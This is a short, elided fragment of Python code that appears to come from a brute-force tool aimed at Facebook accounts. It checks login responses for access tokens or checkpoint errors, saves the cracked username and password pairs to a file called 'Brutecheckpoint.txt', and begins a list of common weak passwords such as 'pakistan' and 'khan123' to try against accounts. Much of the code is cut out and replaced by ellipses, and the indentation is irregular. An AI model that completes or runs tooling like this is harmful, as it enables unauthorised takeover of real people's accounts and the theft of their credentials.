		...
		try:
			...
			if 'access_token' in q:
				...
				if 'www.facebook.com' in q['error_msg']:
					...
					cps = open('Brutecheckpoint.txt', 'w')
					cps.write(k+c+user+'-•◈•-'+pass1+'\n')
					cps.close()
					cpb.append(c+user+pass1)
 				else:
 				    pass2="786786, 1234, 12345, pakistan, pak123, 000786, 786000, pak12345, khan123, khan12345, "
